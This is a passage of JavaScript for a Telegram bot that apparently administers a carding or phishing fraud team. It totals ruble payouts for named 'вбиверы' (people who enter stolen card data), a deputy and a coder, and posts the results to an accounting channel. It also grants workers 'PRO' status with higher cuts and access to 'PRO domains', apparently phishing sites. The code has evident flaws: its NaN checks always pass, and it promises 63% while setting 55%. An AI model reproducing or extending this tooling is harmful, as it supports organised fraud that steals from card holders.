            }

            for (let i = 0; i < res.length; i++) {
                if (res[i].who_vbiver == 'pulseend') {
                    if (res[i].vbiver != NaN) {
                        cassa_res.pulseend += parseInt(res[i].vbiver)
                    }
                }
            }

            for (let i = 0; i < res.length; i++) {
                if (res[i].who_vbiver == 'koussol') {
                    if (res[i].vbiver != NaN) {
                        cassa_res.koussol += parseInt(res[i].vbiver)
                    }
                }
            }
            
            for (let i = 0; i < res.length; i++) {
                if (res[i].who_vbiver == 'krabogrob') {
                    if (res[i].vbiver != NaN) {
                        cassa_res.krabogrob += parseInt(res[i].vbiver)
                    }
                }
            }

            for (let i = 0; i < res.length; i++) {
                if (res[i].who_vbiver == 'mizzzzy') {
                    if (res[i].vbiver != NaN) {
                        cassa_res.mizzzzy += parseInt(res[i].vbiver)
                    }
                }
            }

            for (let i = 0; i < res.length; i++) {
                if (res[i].who_vbiver == 'xnx_scm') {
                    if (res[i].vbiver != NaN) {
                        cassa_res.xnx_scm += parseInt(res[i].vbiver)
                    }
                }
            }

            for (let i = 0; i < res.length; i++) {
                if (res[i].who_vbiver == 'koraabl') {
                    if (res[i].vbiver != NaN) {
                        cassa_res.koraabl += parseInt(res[i].vbiver)
                    }
                }
            }

            for (let i = 0; i < res.length; i++) {
                if (res[i].who_vbiver == 'nekrblat') {
                    if (res[i].vbiver != NaN) {
                        cassa_res.nekrblat += parseInt(res[i].vbiver)
                    }
                }
            }
    
            await q.telegram.sendVideo(-1001556791065, 'https://i.imgur.com/S4iABbZ.mp4', {
                caption: `<b>💲 Итоги за</b> <code>${data.split('_')[1]}</code> 💲\n\n🤑 <b>${res.length}</b> выплат на сумму <b>${currency(cassa_res.workers, { separator: ' ', symbol: '', }).format()}</b> <b>₽</b>\n\n👨🏻‍💻 <b>Вбивер</b> (@h0wtogetm0ney): ${currency(cassa_res.krot, { separator: ' ', symbol: '', }).format()} <b>₽</b>\n👨🏻‍💻 <b>Вбивер</b> (@focuss1488): ${currency(cassa_res.focuss1488, { separator: ' ', symbol: '', }).format()} <b>₽</b>\n\n👨🏻‍💻 <b>Вбивер</b> (@pulseend): ${currency(cassa_res.pulseend, { separator: ' ', symbol: '', }).format()} <b>₽</b>\n👨🏻‍💻 <b>Вбивер</b> (@koussol): ${currency(cassa_res.koussol, { separator: ' ', symbol: '', }).format()} <b>₽</b>\n👨🏻‍💻 <b>Вбивер</b> (@krabogrob): ${currency(cassa_res.krabogrob, { separator: ' ', symbol: '', }).format()} <b>₽</b>\n👨🏻‍💻 <b>Вбивер</b> (@xnx_scm): ${currency(cassa_res.xnx_scm, { separator: ' ', symbol: '', }).format()} <b>₽</b>\n👨🏻‍💻 <b>Вбивер</b> (@koraabl): ${currency(cassa_res.koraabl, { separator: ' ', symbol: '', }).format()} <b>₽</b>\n👨🏻‍💻 <b>Вбивер</b> (@nekrblat): ${currency(cassa_res.nekrblat, { separator: ' ', symbol: '', }).format()} <b>₽</b>\n\n👨🏻‍💻 <b>Зам:</b> ${currency(cassa_res.zam, { separator: ' ', symbol: '', }).format()} <b>₽</b>\n🧑🏻‍🔧 <b>Кодер:</b> ${currency(cassa_res.coder, { separator: ' ', symbol: '', }).format()} <b>₽</b>`,
                parse_mode: 'HTML'
            })
        })
    }

    if (data.includes('kall_none')) {
        q.answerCbQuery(`🤖 Отправляю статистику в канал бухгалтерии...`, { show_alert: true })
        
        let cassa_res = {
            raze: 0,
            krot: 0,
            moscow: 0,
            zam: 0,
            coder: 0,
            workers: 0,
            agattho: 0,
            focuss1488: 0,
            KREWAZZ: 0,
            pulseend: 0,
            koussol: 0,
            krabogrob: 0,
            mizzzzy: 0,
            xnx_scm: 0,
            koraabl: 0,
            nekrblat: 0
        }
        
        await cassa.find({}).lean().then(async (res) => {
            for (let i = 0; i < res.length; i++) {
                cassa_res.zam += parseInt(res[i].zam)
                cassa_res.coder += parseInt(res[i].coder)
                
                if (parseInt(res[i].sumToTake) != NaN) {
                    cassa_res.workers += parseInt(res[i].sumToTake)
                }
            }
    
            for (let i = 0; i < res.length; i++) {
                if (res[i].who_vbiver == 'h0wtogetm0ney') {
                    if (res[i].vbiver != NaN) {
                        cassa_res.krot += parseInt(res[i].vbiver)
                    }
                }
            }
    
            for (let i = 0; i < res.length; i++) {
                if (res[i].who_vbiver == 'rzzzxxxxsss') {
                    if (res[i].vbiver != NaN) {
                        cassa_res.raze += parseInt(res[i].vbiver)
                    }
                }
            }

            for (let i = 0; i < res.length; i++) {
                if (res[i].who_vbiver == 'L1keK1ev') {
                    if (res[i].vbiver != NaN) {
                        cassa_res.moscow += parseInt(res[i].vbiver)
                    }
                }
            }

            for (let i = 0; i < res.length; i++) {
                if (res[i].who_vbiver == 'focuss1488') {
                    if (res[i].vbiver != NaN) {
                        cassa_res.focuss1488 += parseInt(res[i].vbiver)
                    }
                }
            }

            for (let i = 0; i < res.length; i++) {
                if (res[i].who_vbiver == 'KIIVAZ') {
                    if (res[i].vbiver != NaN) {
                        cassa_res.KREWAZZ += parseInt(res[i].vbiver)
                    }
                }
            }

            for (let i = 0; i < res.length; i++) {
                if (res[i].who_vbiver == 'pulseend') {
                    if (res[i].vbiver != NaN) {
                        cassa_res.pulseend += parseInt(res[i].vbiver)
                    }
                }
            }

            for (let i = 0; i < res.length; i++) {
                if (res[i].who_vbiver == 'koussol') {
                    if (res[i].vbiver != NaN) {
                        cassa_res.koussol += parseInt(res[i].vbiver)
                    }
                }
            }
            
            for (let i = 0; i < res.length; i++) {
                if (res[i].who_vbiver == 'krabogrob') {
                    if (res[i].vbiver != NaN) {
                        cassa_res.krabogrob += parseInt(res[i].vbiver)
                    }
                }
            }

            for (let i = 0; i < res.length; i++) {
                if (res[i].who_vbiver == 'mizzzzy') {
                    if (res[i].vbiver != NaN) {
                        cassa_res.mizzzzy += parseInt(res[i].vbiver)
                    }
                }
            }

            for (let i = 0; i < res.length; i++) {
                if (res[i].who_vbiver == 'xnx_scm') {
                    if (res[i].vbiver != NaN) {
                        cassa_res.xnx_scm += parseInt(res[i].vbiver)
                    }
                }
            }

            for (let i = 0; i < res.length; i++) {
                if (res[i].who_vbiver == 'koraabl') {
                    if (res[i].vbiver != NaN) {
                        cassa_res.koraabl += parseInt(res[i].vbiver)
                    }
                }
            }

            for (let i = 0; i < res.length; i++) {
                if (res[i].who_vbiver == 'nekrblat') {
                    if (res[i].vbiver != NaN) {
                        cassa_res.nekrblat += parseInt(res[i].vbiver)
                    }
                }
            }
    
            await q.telegram.sendVideo(-1001556791065, 'https://i.imgur.com/S4iABbZ.mp4', {
                caption: `<b>💲 Итоги за</b> <code>всё время</code> 💲\n\n🤑 <b>${res.length}</b> выплат на сумму <b>${currency(cassa_res.workers, { separator: ' ', symbol: '', }).format()}</b> <b>₽</b>\n\n👨🏻‍💻 <b>Вбивер</b> (@h0wtogetm0ney): ${currency(cassa_res.krot, { separator: ' ', symbol: '', }).format()} <b>₽</b>\n👨🏻‍💻 <b>Вбивер</b> (@focuss1488): ${currency(cassa_res.focuss1488, { separator: ' ', symbol: '', }).format()} <b>₽</b>\n\n👨🏻‍💻 <b>Вбивер</b> (@pulseend): ${currency(cassa_res.pulseend, { separator: ' ', symbol: '', }).format()} <b>₽</b>\n👨🏻‍💻 <b>Вбивер</b> (@koussol): ${currency(cassa_res.koussol, { separator: ' ', symbol: '', }).format()} <b>₽</b>\n👨🏻‍💻 <b>Вбивер</b> (@krabogrob): ${currency(cassa_res.krabogrob, { separator: ' ', symbol: '', }).format()} <b>₽</b>\n👨🏻‍💻 <b>Вбивер</b> (@xnx_scm): ${currency(cassa_res.xnx_scm, { separator: ' ', symbol: '', }).format()} <b>₽</b>\n👨🏻‍💻 <b>Вбивер</b> (@koraabl): ${currency(cassa_res.koraabl, { separator: ' ', symbol: '', }).format()} <b>₽</b>\n👨🏻‍💻 <b>Вбивер</b> (@nekrblat): ${currency(cassa_res.nekrblat, { separator: ' ', symbol: '', }).format()} <b>₽</b>\n\n👨🏻‍💻 <b>Зам:</b> ${currency(cassa_res.zam, { separator: ' ', symbol: '', }).format()} <b>₽</b>\n🧑🏻‍🔧 <b>Кодер:</b> ${currency(cassa_res.coder, { separator: ' ', symbol: '', }).format()} <b>₽</b>`,
                parse_mode: 'HTML'
            })
        })
    }

    if (data.includes('admin_proAcces')) {
        await account.findOneAndUpdate({ tgID: data.split(' ')[1] }, { $set: { status: 'ПРО Воркер', percent: 55 } }).lean().then(async (res) => {
            await q.answerCbQuery(`🤖 Вы выдали воркеру ${data.split(' ')[1]} ПРО доступ`, { show_alert: true })
            await q.telegram.sendMessage(data.split(' ')[1], `🎉 <b>Поздравляем! Вам был выдан доступ к PRO системе!</b> 🎊\n\n❔ <b>В чём заключаются преимущества:</b>\n1️⃣ <b>Повышенный процент при выплатах (</b><code>63%</code><b>)</b>\n2️⃣ <b>Доступ к PRO доменам</b>`, {
                parse_mode: 'HTML',
                reply_markup: {
                    inline_keyboard: [
                        [{ text: 'Чат PRO Воркеров 💬', url: 'https://t.me/+IBJ2iR-TQ0JhYWZi' }]
                    ]
                }
            })
        })
    }

    if (data.includes('admin_proBACK')) {
        await account.findOneAndUpdate({ tgID: data.split(' ')[1] }, { $set: { status: 'Воркер', percent: 55 } }).lean().then(async (res) => {
            await q.answerCbQuery(`🤖 Вы забрали у воркера ${data.split(' ')[1]} ПРО доступ`, { show_alert: true })
        })
    }
})

bot.catch(async (err) => {
    loggy.warn(`globally problems with bot => ${err}`)
})

process.on('unhandledRejection', e => { 
    console.log(e);
    /* exec('pm2 restart main') */
});

process.on('uncaughtException', e => { 
    console.log(e); 
    /* exec('pm2 restart main') */
});

process.on('rejectionHandled', event => { 
    console.log(event); 
    /* exec('pm2 restart main') */
});

module.exports = bot;